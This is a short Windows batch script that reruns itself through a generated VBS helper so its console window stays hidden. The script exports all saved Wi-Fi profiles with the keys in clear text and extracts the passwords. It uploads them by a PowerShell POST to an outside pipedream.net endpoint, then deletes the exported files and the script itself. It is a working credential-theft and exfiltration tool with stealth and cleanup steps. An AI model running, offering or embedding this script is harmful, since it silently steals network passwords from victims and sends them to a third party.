:: This hides the shell window while running commands
:: after first run, inv.vbs is created in %temp%... Invoke like this in future runs to hide window:
::    inv.vbs r1.cmd ry
@echo off
cd %temp%

if not exist inv.vbs (
echo CreateObject^("Wscript.Shell"^).Run "" ^& WScript.Arguments^(0^) ^& "", 0, False > inv.vbs
inv.vbs "r1.cmd ry"
exit
)

if not [%1]==[ry] (
inv.vbs "r1.cmd ry"
exit
)

::Commands go here!
cd %temp%
netsh wlan export profile key=clear
powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS
powershell Invoke-WebRequest -Uri https://eoqq2vgdvjq0ilf.m.pipedream.net/ -Method POST -InFile Wi-Fi-PASS
del Wi-* /s /f /q
del r1.cmd
exit
